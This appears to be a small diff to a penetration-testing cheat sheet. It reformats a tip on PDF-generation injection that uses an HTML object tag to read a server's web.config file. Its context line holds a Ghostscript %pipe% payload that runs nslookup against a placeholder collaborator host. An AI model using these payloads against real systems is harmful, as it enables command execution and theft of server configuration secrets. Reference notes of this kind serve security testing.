@@ -7476,8 +7476,12 @@ mark /OutputFile (%pipe%nslookup YOURCOLLABURL) currentdevice putdeviceprops
 <dl>
 <dd>
 
-Got injection in a PDF, try reading local files with  
-<div><object data=\"c:\\inetpub\\wwwroot\\web.config\">
+Got injection in a PDF, try reading local files with:
+
+```html
+<div>
+    <object data="c:\inetpub\wwwroot\web.config"></object>
+</div>
 
 </dd>
 </dl>
